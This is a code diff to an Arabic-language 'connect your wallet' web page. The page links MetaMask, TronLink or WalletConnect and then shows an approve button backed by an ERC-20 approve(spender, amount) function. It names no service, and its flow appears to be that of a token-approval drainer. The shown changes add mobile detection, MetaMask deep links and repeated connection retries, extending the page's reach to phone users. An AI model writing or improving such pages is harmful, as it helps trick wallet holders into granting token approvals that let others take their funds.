@@ -11,12 +11,17 @@
     <style>
         .wallet-icon { width: 24px; height: 24px; display: inline-block; margin-left: 8px; vertical-align: middle; }
         body { background: linear-gradient(135deg, #1a202c, #2d3748); }
+        .loading::after { content: 'جاري التحميل...'; animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+        .mobile-instructions { display: none; }
+        @media (max-width: 640px) { .mobile-instructions { display: block; } }
     </style>
 </head>
 <body class="text-white flex items-center justify-center h-screen">
     <div class="bg-gray-800 p-8 rounded-xl shadow-2xl max-w-lg w-full text-center">
         <h1 class="text-3xl font-bold mb-6">ربط محفظتك الرقمية</h1>
         <p id="walletStatus" class="text-gray-400 mb-6">اختر محفظتك لربطها وابدأ المعاملة</p>
+        <p class="mobile-instructions text-yellow-400 mb-4">على الهاتف: استخدم متصفح MetaMask المدمج أو امسح رمز QR باستخدام WalletConnect</p>
         <div class="grid grid-cols-2 gap-4 mb-6">
             <button id="connectMetaMask" class="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 flex items-center justify-center">
                 <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" class="wallet-icon"> MetaMask
@@ -74,9 +79,16 @@
             "function approve(address spender, uint256 amount) public returns (bool)"
         ];
 
-        // التحقق من الاتصال المسبق
-        async function checkWalletConnection() {
+        // التحقق من الجهاز (هاتف أم كمبيوتر)
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
+        // التحقق من الاتصال المسبق مع تأخير
+        async function checkWalletConnection(attempt = 1, maxAttempts = 5) {
             try {
+                if (isMobile && !window.ethereum) {
+                    walletStatus.textContent = 'يرجى فتح الصفحة في متصفح MetaMask أو استخدام WalletConnect';
+                    return false;
+                }
                 if (window.ethereum) {
                     const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                     if (accounts.length > 0) {
@@ -85,6 +97,7 @@
                         approveButton.classList.remove('hidden');
                         provider = new ethers.providers.Web3Provider(window.ethereum);
                         signer = provider.getSigner();
+                        return true;
                     }
                 }
                 if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
@@ -92,15 +105,47 @@
                     [connectMetaMaskButton, connectTronLinkButton, connectWalletConnectButton].forEach(btn => btn.classList.add('hidden'));
                     approveButton.classList.remove('hidden');
                     tronWebInstance = window.tronWeb;
+                    return true;
                 }
+                if (attempt < maxAttempts) {
+                    walletStatus.textContent = 'جاري التحقق من المحفظة...';
+                    walletStatus.classList.add('loading');
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    return checkWalletConnection(attempt + 1, maxAttempts);
+                } else {
+                    walletStatus.textContent = isMobile ? 'يرجى فتح الصفحة في متصفح MetaMask أو استخدام WalletConnect' : 'لم يتم اكتشاف أي محفظة. يرجى تثبيت MetaMask أو TronLink.';
+                    walletStatus.classList.remove('loading');
+                }
+                return false;
             } catch (error) {
                 console.error('فشل التحقق من الاتصال:', error);
+                if (attempt < maxAttempts) {
+                    walletStatus.textContent = 'جاري المحاولة مرة أخرى...';
+                    walletStatus.classList.add('loading');
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    return checkWalletConnection(attempt + 1, maxAttempts);
+                } else {
+                    walletStatus.textContent = isMobile ? 'يرجى فتح الصفحة في متصفح MetaMask أو استخدام WalletConnect' : 'فشل التحقق من المحفظة: ' + error.message;
+                    walletStatus.classList.remove('loading');
+                }
+                return false;
             }
         }
 
         // ربط MetaMask
         connectMetaMaskButton.addEventListener('click', async () => {
             try {
+                if (isMobile) {
+                    // محاولة فتح MetaMask عبر Deep Link
+                    window.location.href = 'metamask://dapp/' + window.location.href;
+                    walletStatus.textContent = 'جاري فتح MetaMask...';
+                    setTimeout(() => {
+                        if (!window.ethereum) {
+                            walletStatus.textContent = 'يرجى فتح الصفحة في متصفح MetaMask أو استخدام WalletConnect';
+                        }
+                    }, 3000);
+                    return;
+                }
                 if (!window.ethereum) throw new Error('يرجى تثبيت MetaMask!');
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 walletStatus.textContent = `تم ربط المحفظة: ${accounts[0].slice(0, 6)}...${accounts[0].slice(-4)}`;
@@ -110,21 +155,21 @@
                 signer = provider.getSigner();
             } catch (error) {
                 walletStatus.textContent = 'فشل ربط المحفظة: ' + error.message;
-                setTimeout(checkWalletConnection, 2000); // إعادة المحاولة بعد 2 ثانية
+                setTimeout(() => checkWalletConnection(), 2000); // إعادة المحاولة بعد 2 ثانية
             }
         });
 
         // ربط TronLink
         connectTronLinkButton.addEventListener('click', async () => {
             try {
-                if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) throw new Error('يرجى تثبيت TronLink!');
+                if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) throw new Error('يرجى تثبيت TronLink أو تسجيل الدخول!');
                 walletStatus.textContent = `تم ربط المحفظة: ${window.tronWeb.defaultAddress.base58.slice(0, 6)}...${window.tronWeb.defaultAddress.base58.slice(-4)}`;
                 [connectMetaMaskButton, connectTronLinkButton, connectWalletConnectButton].forEach(btn => btn.classList.add('hidden'));
                 approveButton.classList.remove('hidden');
                 tronWebInstance = window.tronWeb;
             } catch (error) {
                 walletStatus.textContent = 'فشل ربط المحفظة: ' + error.message;
-                setTimeout(checkWalletConnection, 2000); // إعادة المحاولة بعد 2 ثانية
+                setTimeout(() => checkWalletConnection(), 2000); // إعادة المحاولة بعد 2 ثانية
             }
         });
 
@@ -144,7 +189,7 @@
                 approveButton.classList.remove('hidden');
             } catch (error) {
                 walletStatus.textContent = 'فشل ربط المحفظة: ' + error.message;
-                setTimeout(checkWalletConnection, 2000); // إعادة المحاولة بعد 2 ثانية
+                setTimeout(() => checkWalletConnection(), 2000); // إعادة المحاولة بعد 2 ثانية
             }
         });
 
